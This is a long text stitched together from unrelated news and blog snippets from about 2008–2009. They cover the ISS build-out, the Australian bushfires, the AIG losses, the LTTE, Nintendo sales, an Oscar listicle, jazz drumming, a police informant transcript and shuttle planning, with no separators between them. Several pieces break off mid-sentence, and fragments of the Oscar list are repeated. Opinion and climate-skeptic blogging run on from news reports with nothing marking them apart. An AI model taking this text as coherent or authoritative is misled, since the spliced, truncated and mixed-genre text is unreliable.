The fourth set of solar arrays is attached to the sixth starboard truss , or backbone segment , of the platform which was bolted into place on Thursday .
The work took spacewalking astronauts Steve Swanson and Richard Arnold six hours and seven minutes to complete .
Richard Arnold helped bolt down the new backbone segment
The entire ISS backbone - which supports not just the arrays , but radiators and other equipment - now stretches for 102 m ( 335 ft ) .
The solar wings are the last major pieces of US - made hardware to be attached to the station .
Their addition increases the mass of the platform to just over 300 tonnes ( 670,000 pounds ) .
The station is now more than 80 % complete .
Outstanding items include significant European contributions , such as the Node 3 connecting unit , the Cupola window and the European robotic arm .

While we knew that Microsoft CEO Steve Ballmer had forbidden his offspring from using competitors ’ products like iPods and , yes , even Google , we always thought his predecessor , Bill Gates , hovered above the fray , unconcerned with such earthly matters .
Alas , it seems our otherworldly faith in Mr. Microsoft might have been misplaced .
Geeksugar reports that in an interview in this month ’s issue of Vogue , Bill ’s wife Melinda says that Apple products are among the persona non grata ( objecta non grata ? ) in the heavily fortified Gates compound .
“ There are very few things that are on the banned list in our household .
But iPods and iPhones are two things we do n’t get for our kids . ”
I would say that those poor Gates children might feel a little left out when all their peers show up at school sporting the hippest new iPod , while they 're just staring at their Zunes .
However , then I recalled that they arrive at school every morning on talking golden unicorns and my anger on their behalf was , shall we say , assuaged .
For her part , Mrs. Gates does occasionally find herself succumbing to iPhone envy : “ Every now and then I look at my friends and say ‘ Ooh , I would n’t mind having that iPhone . ’ ”
There ’s your opening , Cupertino — time to exploit it .
Wait until she finds out that Bill 's been hiding a MacBook Air in a manila envelope in his office .

A prominent Canadian academic in the tech - policy field has said that " Green IT " initiatives do n't work .
" Most of the negative environmental impacts [ of IT ] occur in the form of completely unintended , second and third order effects , " says Professor Richard Hawkins of Calgary Uni .
" These ' rebound ' effects may not be mitigated by inventing ' greener ' IT products and , indeed , may be intensified by such changes . "
As an example , the prof cites mobile phones , saying that even if the phone itself has no environmental consequences its existence will still encourage people to move about more - in cars , planes , whatever - than they otherwise would , so contributing to carbon emissions and climate change .
" We did n't adopt the mobile phone so we could drive and talk on the phone , we adopted it because we were already driving so much .
Creating a greener cell phone wo n't reduce the impact of increased mobility .
The real question is what amount of mobility is sustainable ? "
This line of argument would also no doubt apply to such technologies as mobile push email , voip , video calling , netbooks etc .
If you did n't have that smartphone or UMPC you 'd stay in the office and burn less transport fuel , sort of thing .
This is n't just your ordinary academic pondering - Hawkins ' research may influence global policymakers .
He and his team will be presenting their thoughts at a Euro comms- policy conference in Spain next month , and to the UN Earth Summit at the end of the year .
This will inform the OECD IT 'n 'sustainability initiative , among other things .
There are full details from Calgary Uni here . ®
Marysville is the town that disappeared .
Once known as Melbourne 's honeymooning centre , with its pretty guesthouses and century - old oaks , the town , about 60 miles from the Victoria state capital , is now a smouldering , post - apocalyptic wasteland .
From the air , nearby St Fillans resembles a row of campfires - piles of powdery ashes with the embers trampled out .
The landscape is deserted , with caravans , boats and burned - out cars abandoned in the middle of roads .
Many appear to have been trapped by flying debris - huge sections of what were once walls which have blocked the road .
A house under construction is untouched by fire , but the savage winds have scattered its beams , like a child 's game of pick - up sticks amid the scorched earth and blankets of smoke .
Some calamity appears to have destroyed civilization - it's like a film set , perhaps for Cormac McCarthy 's post - nuclear novel The Road .
On the Maroondah Highway a shrouded corpse lies on scarred earth , surrounded by police tape .
Black dots under trees turn out to be fried animals .
The horror of those furious minutes when panicked residents tried to flee the firefront is evident on a road that connects the towns of Whittlesea and Kinglake .
Cars litter the road , crashed and abandoned .
In many cases , the cars that people sought as their only hope of survival , became their tombs .
On one corner just west of Kinglake , six cars lie , four completely burned out .
They rest in ditches and crashed into fallen tree limbs .
A motorbike lies , crashed into a tree , on the side of the road .
Molten metal , car parts melted into the road , are a sign of the heat that tore through .
Elsewhere on the road there are cars that have crashed head - on .
Bodies are still being removed from the burned - out shells .
Police scientists and coroners are on the scene .
The official death toll in Kinglake is 12 .
In nearby Kinglake West , another 10 .
But there are still , almost certainly , other bodies not yet found , people unaccounted for .
Fire crews are moving from house to house , checking each room , every shed , every water tank .
Survivors described the firefront , fanned by the changed wind direction , as ferocious - and fast .
Maryanne Mercuri was listening to the radio news for fire updates .
Kinglake was n't mentioned .
" Within two minutes , the sky went black with smoke , it was black like it was midnight , and the fire was right there .
There was nothing we could do .
We could n't escape , we could n't go anywhere , " she said .
" Fire was falling from the sky , huge shoots of flame .
Mercuri , her husband , Rod , and children Allison , 11 , and Dean and Kirk , both nine , took shelter first in the garage .
When that caught fire , they ran to their shed , before running back to the house .
She covered the children with towels , just something to protect them from the scorching heat .
" We did n't have time to wet them , I could n't even see them , it was just whatever I could grab in the dark and the smoke , " she said .
" They were good kids , they were really good kids .
But we were all scared .
We were all so scared .
We even talked about heaven . "
In the town of Narbethong , where the charred ground crunches underfoot , it is eerily silent .
There is no noise , no birds .
Rows of houses have been destroyed , a melted truck still burns , the corrugated iron of water tanks is twisted like plasticine .
Only the metal clothes lines survived intact .

The most controversial film to tackle Coptic life is I Love Cinema A film recently opened in Cairo has revived a controversy about the depiction of Copts in Egyptian drama .
The film , called One - Nil , tells the story of a Christian woman who is granted a divorce but cannot remarry because of the strict rules of the Egyptian Coptic Church .
The film is the latest in a series of dramatic works which focus on Christian issues and characters .
Starring Elham Shahin and Khaled Abou El Naja , the movie deals with the social circumstances of the Egyptian middle class .
Within its plot and subplots , the film follows the tragic story of the heroine who wants to remarry .
She rejects a solution proposed by her lawyer that would allow her to divorce and get married again - convert to Islam - and instead conducts an illicit affair with the hero played by El Naja .
The rules of the Coptic Church prohibit its members from getting a divorce , with two exceptions : if one party proves adultery by the other or if one of the two parties converts to another religion .
Critics say the film slanders Christian marriage .
Najib Gabriel , a lawyer , submitted an application to court to stop the film from being shown , although he later retracted it .
Mr Gabriel told BBC that he believed the film was " a message to the Church to amend the Holy Book , which is unimaginable , or to encourage the 4,000 divorced Coptic women in Egypt to rebel against the Coptic Pope " .
Khaled Abou El Naja is the male lead in the film One - Nil
The film 's producers defend the work by saying it does not demand anything of the Church and that they merely wish to draw attention to the predicament of some Egyptian Christian women .
Sharp criticism
The film is not the first of its kind to cause controversy .
About eight years ago a dispute raged when a TV drama series entitled Time of Roses depicted a Christian woman married to a Muslim man .
This subject has become highly sensitive and has led to sectarian violence in many Egyptian areas .
But it was another film entitled I Love Cinema , whose writer and producer were both Christians , which was the most controversial .
Its plot was considered by some to be critical of very religious Coptic Christians , who fast for about 200 days a year .
The film was also criticised for shooting some of its scenes in a non-Coptic church although it was meant to depict a Coptic church .
Yusuf Sidhum , the editor of Watany newspaper , who takes a particular interest in Coptic affairs , says that artists ' freedom of expression cannot be curbed .
While a movie cannot be expected to provide solutions to complex issues such as divorce among Copts , he believes an artist 's freedom to focus on social problems must not be limited .
" I cannot understand how an artistic work can be proscribed under the pretext of respect for the feelings of a few people .
If we allowed ourselves to use respect for feelings to stop any artistic work , all forms of innovation and art would dry up , " he says .
The issue then is artistic freedom versus respect for the feelings of the few at a time charged with sectarian tension .

• Rebels in Sri Lanka said to have lost 90 % of fighters •
Aid agencies fear for fate of civilians in north - east
The Liberation Tigers of Tamil Eelam , a rebel army that has fought a 25 - year civil war against the Sri Lankan state , is " finished " , having lost more than 90 % of its fighters , the group 's former military commander said yesterday .
In an interview with the Guardian , Colonel Karuna said around 1,500 surviving rebels , who have made their last stand on a sliver of the north - east coast , are surrounded by 65,000 troops of the Sri Lankan army , with no way out .
At the height of their powers the Tigers could muster more than 15,000 men at arms .
" It is a do or die battle for the LTTE , " said Karuna .
" The battle is now street to street and door to door . "
Karuna is the nom de guerre of Vinayagamoorthy Muralitharan , who until 2004 was the Tigers ' military commander .
Many see his defection as a turning point for the LTTE .
Not only was Karuna privy to all the Tiger 's best - kept secrets , he also brought with him 6,000 battle hardened fighters .
The 45 - year - old now describes his former leader , Velupillai Prabhakaran , as " a mad man " .
" He wanted to be a king , a duke ... he had a totalitarian mindset .
I told him the LTTE could never win .
I had spent 22 years on the battlefield .
But he did not listen . "
Prabhakaran , he said , had made a series of tactical blunders in the war culminating in the suicide gamble of holding territory .
" After he lost [ the Tigers ' capital ]
Kilinochi he knew he could not make a stand .
But he thought the Tigers could survive among the people .
Now the LTTE has trapped 100,000 people and [ Prabhakaran ] has gone to the jungles [ preparing for ] a guerrilla war . "
Aid agencies have warned of a looming humanitarian catastrophe as the Sri Lankan army has pounded the Tiger positions , which have been placed amid the cornered population .
The UN says that 2,800 civilians have been killed and more than 7,000 injured in the fighting .
Karuna says he has warned the country 's president Mahinda Rajapaksa " this is a critical situation .
They have listened .
The army do not use sea or air power .
I have told them be careful . "
For as long as the Tigers exist , Karuna cannot live in the open - and his family remain in the UK .
The Guardian met him after passing a line of armed guards at a secret location in Colombo .
Officials in Sri Lanka admit he has " blood on his hands " but say he should be forgiven because he renounced violence .
The LTTE 's former military supremo says one of the reasons why the Sri Lankan army has been so successful is the new commando units that tracked the Tigers ' through their phone calls - pinpointing their jungle lairs .
" The LTTE can never be built up again .
They can't use any communications .
They are finished . "
He admits a high regard for the Sri Lankan army commander , Sarath Foneska , who survived a Tiger suicide bombing in 2006 .
Karuna says he almost killed him on the battlefield .
" We bombed him once during an operation , but he escaped .
Lost a colonel and few others though .
Now we meet frequently and talk about our past .
He was a war hero .
So was I . We appreciate each other . "
Karuna was made Sri Lanka 's minister for national integration this week - a remarkable transition for a man who as a teenager joined the Tigers ' armed struggle in 1983 , enraged by the killings of Tamils in Colombo and beguiled by the Tiger 's " big propaganda " .
" We thought we could save our people ... but that I know now was not the way , " he said .
Karuna said he fell out with Prabhakaran who called him a " traitor to his race " for signing an agreement with the Sri Lankan government during peace talks in Oslo in 2003 .
Under the terms of the deal the rebels were to consider giving up the LTTE 's cherished aim to carve out a separate nation for the island 's 3 m Tamils in return for the creation of a " federal government " .
NEW YORK ( Reuters ) - American International Group Inc posted a $ 61.7 billion fourth - quarter loss -- the biggest quarterly loss in corporate history -- after reaching a revised rescue deal with the U.S. government that wards off for now the prospect of crippling credit rating downgrades .
The massive quarterly loss , equal to $ 22.95 a share , was AIG ’s fifth in a row , bringing the total loss over that period to more than $ 100 billion .
The U.S. Treasury and Federal Reserve said AIG had posed a systemic risk requiring government action to prevent its problems from damaging the entire financial system .
AIG , the recipient of $ 150 billion in taxpayer aid last year , will get access to an additional $ 30 billion under the government ’s revised plan announced on Monday .
It also got more lenient terms on existing financing and will be able to significantly pay down an outstanding credit facility in a swap that will give the government a preferred - share stake in two life insurance businesses .
AIG also announced plans to spin off part of its property - casualty business , to be renamed AIU Holdings .
The revamped rescue package is the third since last fall when the government stepped in to bail out AIG , once the world ’s biggest insurer by market value .
The Treasury and the Fed said that AIG , which has counterparties around the globe , was so important to the U.S. economy and financial system that it had to be helped , and they held out the possibility more aid might be needed .
“ This will take time and possibly further government support if markets do not stabilize and improve , ” they said in a statement .

Last weeks ’ top Antarctic AGW story was :
due to CO2 , of course .
This week the # 1 story is :
but the increase in size is due to “ stratospheric ozone depletion ” which is of course also caused by man-made gases .
So Antarctic ice is disappearing faster than expected due to man , and it is also expanding in size due to man .
Meanwhile , the early autumn temperature in Vostok , Antarctica is a toasty - 95 F , a nice warm up from the - 104 F temperatures earlier this week .
Oh , and one minor problem with the ozone hole theory “ The ozone hole occurs during the Antarctic spring , from September to early December ” – but the positive ice anomaly occurred during the autumn and winter ( March through July ) as represented by the red line below .
http://arctic.atmos.uiuc.edu/cryosphere/IMAGES/current.365.south.jpg
And while the ozone hole was present , ice was normal .
So the ice excess probably has nothing to do with the ozone hole .
http://www.cpc.noaa.gov/products/stratosphere/polar/polar.shtml
The AGW standard for broad acceptance of new theories seems to be “ not completely implausible – if you avoid actually looking at the body of data or what you might have said last week . “

As 2009 opened , three weeks before Barack Obama took office , the Dow Jones Industrial Average closed at 9034 on January 2 , its highest level since the autumn panic .
Yesterday the Dow fell another 4.24 % to 6763 , for an overall decline of 25 % in two months and to its lowest level since 1997 .
The dismaying message here is that President Obama 's policies have become part of the economy 's problem .

WASHINGTON - With President - elect Barack Obama and congressional Democrats considering a massive spending package aimed at pulling the nation out of recession , the national debt is projected to jump by as much as $ 2 trillion this year , an unprecedented increase that could test the world 's appetite for financing US government spending .
For now , investors are frantically stuffing money into the relative safety of the US Treasury , which has come to serve as the world 's mattress in troubled times .
Interest rates on Treasury bills have plummeted to historic lows , with some short - term investors literally giving the government money for free .
But about 40 percent of the debt held by private investors will mature in a year or less , according to Treasury officials .
When those loans come due , the Treasury will have to borrow more money to repay them .
With the government planning to roll over its short - term loans into more stable , long - term securities , analysts say investors are likely to demand a greater return on their money , saddling taxpayers with huge new interest payments for years to come .
Some analysts also worry that foreign investors , the largest US creditors , may prove unable to absorb the skyrocketing debt , undermining confidence in the United States as the bedrock of the global financial system .
After the nation slipped into recession in the wake of a housing foreclosure crisis , Washington approved $ 168 billion in spending to spur economic activity , $ 700 billion to prevent the collapse of the US financial system , and multibillion - dollar bailouts for a variety of financial institutions , including insurer American International Group and mortgage financiers Fannie Mae and Freddie Mac .
Now , Washington is debating as much as $ 850 billion in new federal spending , as well as tax cuts , to stimulate the economy .

Hello Fellows ,
Recently Google Japan launched a new home page where it was promoting a list with the most searched terms typed on its search engine .
It ´s a kind of “ HotWords ” also found on Twitter :
Accordantly with TechCrunch , that new service has been already available to include in the iGoogle page of any user .
The big trouble arose when Google Japan decided hire an online marketing company , Cyberbuzz , to promote that new tool , already available as a widget to webmasters , through pay - per-posts .
Well , some good integrations arose from that process as reported by TechCrunch , but this number was really low if you get note by the research in Google BlogSearch .
Google Japan swam against the flow of good online advertising practices supported by its headquarter in the USA , when it dicided to use pay - per-posts campaigns .
All of us know how Google USA fights Pay - per - Post practices .
So far so good for Google Japan .
But just for now .
Yesterday , Fabio Ricotta an SEO blogger from Brazil noticed a twitter message written by Matt Cutts leader of the Google Anti Spam team where he announced a punishment to Google Japan .
He made a question to him about the issue and Matt gave a positive answer confirming the punishment .
We don´t know if that was an isolated action , took by the Anti Spam team , because the Google Japan was punished after 46 paid posts ( Noticed at the Google BlogSearch research ) .
It ´s a little suspected think that an algorithm detected the issue , but we cannot discard this hypotheses .
Well , the most important thing to learn from the whole history is : even the Google branches in other countries can’t walk away with something concerning the Google Anti Spam Polices , and if you intend or actually do pay - per - posts then you must open your eyes , maybe you are the next to lose Page Rank from one day to another .
Visit our SEO Blog and enjoy all information we provide about search engine oprtimization .
The holidays were very merry for Nintendo which sold 3.04 million Nintendo DS handhelds during the month of December , ending 2008 with the best - selling console in the United States , blowing far past the console competition .

Nintendo hardware secured the top spot last month — as it had done every month in 2008 — thanks to record - breaking Nintendo DS sales .
It also secured the number two spot , yet again , with strong sales of the Wii .
The console sold in excess of 2.1 million units to U.S. consumers , besting its record - smashing November take of 2.04 million .
But it 's the Nintendo DS that set the bar highest , as no video game platform has ever sold more than 3 million units in one month , breaking the PlayStation 2s record of 2.7 million in December of 2002 .
Total Nintendo hardware sales were over 5.19 million for the month .

The Xbox 360 took third place , selling over 1.4 million , almost twice that of its PlayStation 3 competition .
Nintendo DS - 3,040,000
Wii - 2,150,000
Xbox 360 - 1,440,000
PSP - 1,020,000
PlayStation 3 - 726,000
PlayStation 2 - 410,000
Total hardware spend for the month of December was an impressive $ 1.88 billion USD , bringing the year total to $ 7.81 billion .
That 's an 11 % improvement over the previous year , a 2 % improvement over the previous month .

" 38 months into this generation of hardware , the three new systems have sold a combined 38.2 million units , whereas at the same point last generation , in December 2003 , the three systems had sold 36.9 million units , " writes NPD analyst Anita Frazier .
" Factoring in the continued strong sales of the PS2 even after the new systems were released , 52 million systems have sold at retail since November ' 05 . "
This week marks the seventh anniversary of the murder of our son , former Wall Street Journal reporter Daniel Pearl .
My wife Ruth and I wonder : Would Danny have believed that today 's world emerged after his tragedy ?
The answer does not come easily .
Danny was an optimist , a true believer in the goodness of mankind .
Yet he was also a realist , and would not let idealism bend the harshness of facts .
Neither ...
Congratulations , you won an Oscar !
Now ruin your credibility forever by starring in a shitty action movie or a throwaway thriller .
Here are the worst Oscar winning offenders in Hollywood history : 10 .
Charlize Theron - Won For : Monster , Next Film : Aeon Flux Charlize went from a gritty , ugly indie to a glossy , empty adaptation of a cartoon .
But really , can anyone blame her for wanting to show the world she ’s still pretty ?
I can ’t .
9 . Jennifer Connolly - Won For : A Beautiful Mind , Next Film : Hulk
At least Academy fave Ang Lee was directing this misguided comic book movie as opposed to Michael Bay .
And it ’s not like A Beautiful Mind was all that great to begin with .
8 . Angelina Jolie - Won For : Girl , Interrupted , Next Film : Gone in Sixty Second
What ’s worse , playing a car thief in a movie whose entire screenplay consisted of one page with “ BIG CAR CHASE ” scribbled on it , or making out with your brother ?
Angie did both after winning her Oscar , and she ’s still working , so what do I know ?
Charlize went from a gritty , ugly indie to a glossy , empty adaptation of a cartoon .
But really , can anyo
7. Jamie Foxx - Won For : Ray ( and nominated the same year for Collateral , too ! ) , Next Film : Stealth
Foxx inhabited the soul of an iconic music legend , and then a pilot in an unmemorable “ high - octane ” action movie .
As long as he stops singing Ray Charles ’ “ What I Say ” at any given moment , I ’m happy .
6 . Roberto Benigni - Won For : Life is Beautiful , Next Film : Pinocchio
You directed , wrote and starred in one of the most heart - tugging tearjerkers ever , and you follow it up by playing a little wooden boy when you ’re 48 years old ?
Thank god nobody saw it .
5 . Halle Berry - Won For : Monster ’s Ball , Next Film : Swordfish , Film After That : Die Another Day
All that sobbing onstage while accepting her Oscar must have tuckered Halle Berry out , since she completely gave up right after .
At least Berry ’s breasts have never jumped the shark – they ’re still doing their best work !
4. Hilary Swank – Double winner / loser !
Won For : Boys Do n’t Cry Next Film : The Gift , Won For : Million Dollar Baby , Next Film : The Black Dahlia
No one else bounces back and forth from being the best actress to the absolute worst like Hilary Swank .
Is there an award for that ?
3 . Helen Hunt - Won for : As Good As It Gets , Next Film : Dr. T and the Women It took Helen three years to make that boring , uninspired follow - up film , too !
She tried avoiding the Oscar curse by disappearing off the face of the Earth .
2 . Robin Williams - Won For : Good Will Hunting , Next Film : Patch Adams Robin played a good - humored doc who just wants to help people .
Then he won an Oscar , and went straight to playing a red - nose wearing freak who makes us all cry .
But this is n’t even the worst poorly chosen post - Oscar role in history .
The king of that would be ...
1. Kevin Spacey - Won for : American Beauty , Next Film : Pay It Forward , Film After That : K - Pax , Film After That : The Shipping News I could go on .
But why torture ourselves any further ?
Honorary Mention : Cuba Gooding Jr. Cuba went from Oscar Winner ™ to punchline pretty fast , but people seem to forget after Jerry Maguire , he was in As Good As it Gets , What Dreams May Come ( cheesy , but successful ) and Men of Honor .
Not too shabby !
Then a literal and figurative Pearl Harbor hit Cuba ’s career , and it was Rat Race , Snow Dogs , The Fighting Temptations , Boat Trip , Radio , Norbit , Daddy Day Camp …
I think his Oscar has deteriorated into dust by now , if he has n’t sold it for firewood yet .
So whose next to sell their soul ?
Everyone !
Penelope Cruz has a voice in G - Force as a CGI guinea pig , while Sean Penn is rumored to play Larry ( not even Moe ! ) in a Three Stooges movie .
And do n’t rule out Heath Ledger just cause he ’s dead – he ’s still got one film left to come out , and The Imaginarium of Doctor Parnassus does n’t exactly look like Dark Knight 2 .
Cuba went from Oscar Winner ™ to punchline pretty fast , but people seem to forget after Jerry Maguire , he was in As Good As it Gets , What Dre
It ’s official .
After a contentious few weeks same - sex couples began marrying in Iowa today , despite the actions of anti-gay activists who delivered petitions demanding state offices refuse to issue licenses to gay couples .
But so far the day has proceeded without incident , many couples hoping to have the mandatory 3 - day waiting period waived so they can exchange their vows today .
Watch :
Congratulations to our brothers and sisters in Iowa !

How to Play Jazz Drums
Jazz is one of the most artistic styles of music around , especially for drummers .
Jazz gives the drummer the opportunity to show their true colors and skills .
The problem is most drummers do not take the time to learn how to play jazz drums ; which is a big problem .
Playing jazz drums is not too hard theoretically ; however , most drummers are used to 4/4 rock drumming .
Jazz is played with a lot of triplets .
It has a totally different feel than rock , and the drummer has a different job .
So let ’s take the time to learn how to play basic jazz on the drums .
Alot of jazz includes fast drumming , so make sure you check out this article on boosting your stick speed .
Also , jazz is a very unique style of music that requires perfect timing , so make sure you check out this article on developing your timing !
How to Play the Jazz Swing Groove
The first thing you need to learn when playing jazz is the basic jazz swing groove .
A jazz drummer ’s main job is to keep time for the rest of the group .
You never want to overpower the rest of the band .
To do this , simply use your hi hat and ride cymbal .
Let ’s start with your hi hat .
With your foot , step on the 2 and 4 count .
It is VERY important to keep this groove over top of everything you play in jazz .
Although it is only you ’re hi hat , it is very important for the swing groove .
Next we will add the ride cymbal .
This is played with a triplet feel as you will see in the sheet music provided .
Take your time to master this groove .
How to Add the Bass Drum
Jazz drums are sometimes very subtle compared to the rest of the band .
This being the case , the bass drum should n’t be too dominant .
Make sure you do not play the bass drum to loudly at all .
A good technique for this is heel down bass drum playing .
This way you can control the volume of the kick .
A technique jazz drummer ’s use is feathering the bass drum .
This is done by lightly tapping the bass drum on the quarter , or eighth notes .
Usually the bass drum will follow the bass guitar player , so try and determine what kind of progression the bass player is playing and try to follow him .
Make sure you cannot hear the bass drum too much but rather feel it .
This is the basic jazz swing groove that you will hear most commonly in jazz music .
The hi hat and ride cymbal are very important , so make sure you have a solid groove developed with those before moving on .
The bass drum should be more of a feeling and not an over powering thump like in rock drumming .
As for your left hand , this is totally up to you depending on the song .
The snare can be used to help accent the rest of the band , or can be used to play straight quarter notes .
It is all personal .
Try learning how to play the shuffle pattern , this is another variation of jazz that is very fun to play !
Check out this article on Drum Soloing to give you some ideas for adding in some jazz solos nad fills .
Also , the Moeller Method has become very popular with this style of music .
So take your time and develop this jazz swing groove , and you will be playing along with the pros in no time !

I ’m happy to report that Emenai is no longer a stranger to TOE .
That ’s right , he has come out of hiding .
I know that he would like to retract his words , but we got him on record :
u cant just steal stuff without say from where they come .
texpat , im crazed ?
come to oftersheim , i will nihilate u. myrjellyfish dont know what ur talking about .
fiu ???????
f u !!!!!!!
To fill you in , the master pen spinner from Germany turned out to be a loyal listener of WVUM 90.5 , as well as a stickler for proper citation of sources .
As such , he took issue with TOE failing to credit the University of Miami ’s radio station for use of their phrase , Keep it locked on The Voice .
He went so far as to threaten us if we did n’t give credit where credit was due .
A reasonable demand , and we stand corrected .
Emenai , feeling good about rectifying our methods , has gone back into hiding , his job done .
Once again , all we have as evidence of his humble existence is his vault of video clips that testify to a preternatural dexterity .
First pen spinning and now Cubefield .
Just to give you an idea of how good Emenai is at Cubefield , I submitted the popular arcade to the Reddit WebGames community to see how they would fare .
After numerous attempts none of the self - professed gamers were able to come close to Emenai ’s top score of 972,205 even after playing on a “ slow computer , with no graphics acceleration , and the browser full - screen ” , which , so I hear from all the Cubefield cheaters out there – yeah , you all know who you are , thinking you ’re smooth because you can hold down the right arrow key – makes the lighting - fast Cubefield a “ crawwwwl . ”
Here ’s Emenai playing Cubefield on his MacBook Pro , using left and right arrow keys as needed .
Enjoy :
To see how you rank against Emenai , play Cubefield here .
You should note that there is no end game ; the same levels just get faster and faster .

WASHINGTON ( Reuters ) - President Barack Obama , in his first major military decision , has ordered 17,000 more U.S. troops to Afghanistan to tackle worsening insurgent violence , the White House said on Tuesday .
“ This increase is necessary to stabilize a deteriorating situation in Afghanistan , which has not received the strategic attention , direction and resources it urgently requires , ” Obama said in a written statement .
As a presidential candidate , Obama promised to focus more attention on the war in Afghanistan , where violence has risen dramatically in the past two years as Taliban militants and other insurgents have gained strength .
“ The decision was communicated to the Pentagon yesterday .
The orders were signed today , ” White House spokesman Robert Gibbs told reporters traveling with Obama in Denver .
The 17,000 troops include an Army brigade equipped with Stryker armored vehicles , a Marine expeditionary brigade and support personnel , officials said .
The forces are part of an anticipated U.S. troop build - up that could expand the U.S. military presence in Afghanistan to 60,000 troops , from a current 38,000 , in coming months .
There are also some 30,000 troops from NATO nations attempting to stabilize Afghanistan .
“ There is no more solemn duty as President than the decision to deploy our armed forces into harm ’s way , ” Obama said .
“ I do it today mindful that the situation in Afghanistan and Pakistan demands urgent attention and swift action . ”
The announcement comes while the White House is still conducting a broad review of U.S. policy on Afghanistan .
The deployment provides two of three extra combat brigades requested by top U.S. and NATO commander in Afghanistan , U.S. Army General David McKiernan .
The extra forces will go to southern Afghanistan , where a shortage of U.S. and NATO troops face an intensifying Taliban insurgency .
The units had originally been scheduled to go to Iraq and Obama ’s said “ the fact that we are going to responsibly drawdown our forces in Iraq allows us the flexibility to increase our presence in Afghanistan . ”
A senior administration official said on Tuesday Obama will make a decision in weeks on cutting troop levels in Iraq , where the United States has 146,000 troops .
Obama has pledged to pull out all U.S. combat troops from Iraq within 16 months , while shifting thousands of soldiers to Afghanistan .

Both Democrats and Republicans welcomed Obama ’s decision to send more troops to Afghanistan .
Sen .
John McCain , the Arizona Republican defeated by Obama in last November ’s presidential election , described the situation in Afghanistan as “ dire . ”
But he also called on Obama to spell out a clear strategy .
“ There still exists no integrated civil - military plan for this war -- more than seven years after we began military operations , ” McCain said .
“ A major change in course is long overdue . ”

Officer 1 : " See as we said to you earlier , if we could find some way that we could work together – in a sort of a job . "
Officer 1 : " Or does that bore you ? "
[...]
Officer 1 : " ... for a coffee or something ?
I do n't expect people to work for nothing . "
Tilly : " Mmm hmm .
And what kind of money would you be talking ? "
Officer 1 : " Are you still recording ? "
Tilly : " Quite possibly .
I do n't know I have n't looked .
It only had half an hour and it 's been way past half an hour .
Yeah well what kind of money would you be talking ? "
Officer 2 : " Well we do n't discuss money frankly , we do n't talk salaries "
Tilly : " Well what do you talk then ?
You talk coffees ? "
Officer 2 : " Well let 's just say if you were prepared to to meet us , and talk to us , we may be in a position to help you out financially . "
Tilly : " But you wo n't go into how much or anything like that . "
Officer 2 : " But it 's your decision .
We can't force you to it , you 're free to walk away at any time , you 're free to walk away at any other time .
Tilly : " Obviously like 20 or 50 quid is n't going to sort out my problems . "
Officer 2 : " Sorry ? "
Tilly : " Obviously 20 quid , 50 quid is n't going to sort out my problems . "
[ Inaudible chatter ]
Officer 2 : " Tilly , we are not concerned about Plane Stupid .
We are not concerned about Plane Stupid .
We are concerned about individuals within Plane Stupid .
That 's where the difference is . "
Tilly : " Tell me which ones I should look out for , if you 're so worried about it . "
Officer 1 : " Look at the big picture – we work with hundreds of people , believe me , ranging from terrorist organisations right through to whatever .
To the others as we like to call them .
Environmentalists .
We have people who give us information on environmentalism , leftwing extremism , rightwing - you name it , we have the whole spectrum of reporting .
The point we 're making is : they come to us with the concerns , because within the organisations for which they have strong ideologies and beliefs they are happy to go along with that , but what they will not get involved in is maybe where it 's gonna impact someone else .
That 's when they come to us and say 'by the way , so and so – in my opinion – is maybe getting a wee bit too hotheaded . "

Shuttle managers have made extensive changes to their 2010 launch schedule ambitions , with the “ inclusion ” of STS - 134 as an additional flight .
Meanwhile , three additional External Tanks being worked on at the Michoud Assembly Facility ( MAF ) in pre-emption of a shuttle extension .
STS - 133 and STS - 134 :
According to planning documents on L2 , STS - 133 will now carry a Multi-Purpose Logistics Module ( MPLM ) , while the “ additional flight ” of STS - 134 – which is planning to carry the Alpha Magnetic Spectrometer ( AMS ) , pending funding – continues to solidify its place in the forward planning .
The Space Shuttle Program ( SSP ) manifests are planning documents , created by the Flight Assignment Working Group ( FAWG ) , which are used to work out requirements ahead of being baselined into the schedule .
The missions then undergo a series of reviews via the Program Requirements Control Board ( PRCB ) , notably the Flight Definition and Requirements Directive ( FDRD ) review , as they officially line up in the shuttle schedule .
Neither STS - 133 or STS - 134 have moved into that baselining stage , with STS - 131 the latest mission heading to the FDRD – meaning they are not yet official missions .
NASA and the contractor groups such as the United Space Alliance ( USA ) work off several schedules / manifests , in order to prepare flow timelines and create “ need by ” dates for the hardware that will fly on that particular mission , should that mission become baselined into the schedule .
STS - 134 , which first appeared on the FAWG manifest last year as the LON ( Launch On Need ) flight for STS - 133 , has now become the AMS ( Alpha Magnetic Spectrometer ) flight on all three planning documents ( FAWG , STS and ISS launch schedule , and USA ’s ISS / STS and Eastern Range schedule – see left , available on L2 ) .
According to those planning documents , STS - 134 will fly with Discovery , on a NET ( No Earlier Than ) September 16 , with AMS - 02 and EXPRESS Logistics Carrier - 4 ( ELC ) .
It may also include the Remotely Operable Electrical Umbilical - 755 ( ROEU ) , which is also gains a place in the planning document on STS - 132 and STS - 133 .
STS - 133 also changes from carrying two ELCs , to just one ( ELC - 3 ) , with a MPLM – likely to be Leonardo – making up the vacant payload space / mass .
The mission is currently working to a NET of July 29 , 2010 , flying with Endeavour .
Previous manifests in 2008 classed both STS - 132 and STS - 133 as only CLF ( Contingency Logistics Flights ) , and technically they remain as such until they ’ve proceeded through the baselining process .
Funding for STS - 134 is yet to be arranged , although strong moves have already taken place at the Government level , which passed the a NASA Authorization Bill in late September of last year .
The bill directs NASA to ‘ take all necessary steps ’ to add STS - 134 ’s delivery of the AMS to the Station .
However , it contains a caveat for the NASA Administrator to cancel the flight within one year of its launch , if it is determined that it will cost significantly more than the existing cost estimate , or that it would create an unacceptable safety risk .
In such an event , Congress would then have to reauthorize the flight , or the President would have to certify that it is in the national interest to fly the mission .
MAF ’s Additional
Tanks :
One old tank and two brand new tanks – all currently unmanifested on the planning documents – are being prepared for the opening salvo of additional flights that would be added in the event of shuttle extension .
Two new tanks have built up part of their aft domes , with “ ET - 140 ’s quarter panels for the aft dome are welded up , ( and ) ET - 141 ’s two aft dome quarter panels welded up , ” according to Lockheed Martin / MAF information on L2 .
“ ET - 122 : Have begun some foam removal activities . ”
The confirmation that ET - 122 – the tank that was damaged during hurricane Katrina , and subsequently removed from the flight manifest – has returned to production means a total of three additional tanks , post STS - 134 , are in early stages of processing .
Tooling and floor space plans have also been created , in the event of extension , to ensure they do not conflict with requirements for the production of Constellation hardware .
“ Will begin this week to remove 5001 tool ( tool that welds the dome door panels into quarter section ) following all ET - 141 welds , ” added the Lockheed Martin / MAF information .
“ Will pull that tool out to make way for the upper stage for Ares .
